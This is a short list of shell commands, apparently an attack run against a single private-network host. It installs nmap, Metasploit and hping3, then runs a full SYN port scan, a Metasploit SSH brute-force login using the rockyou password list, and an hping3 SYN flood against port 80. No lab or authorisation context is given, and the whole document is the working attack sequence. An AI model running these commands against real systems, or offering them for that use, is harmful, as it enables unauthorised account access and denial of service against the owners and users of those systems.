sudo apt install -y nmap metasploit-framework hping3
nmap -sS -p- 192.168.22.136
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.22.136
set USERPASS_FILE /usr/share/wordlists/rockyou.txt
run
hping3 -S --flood -p 80 192.168.22.136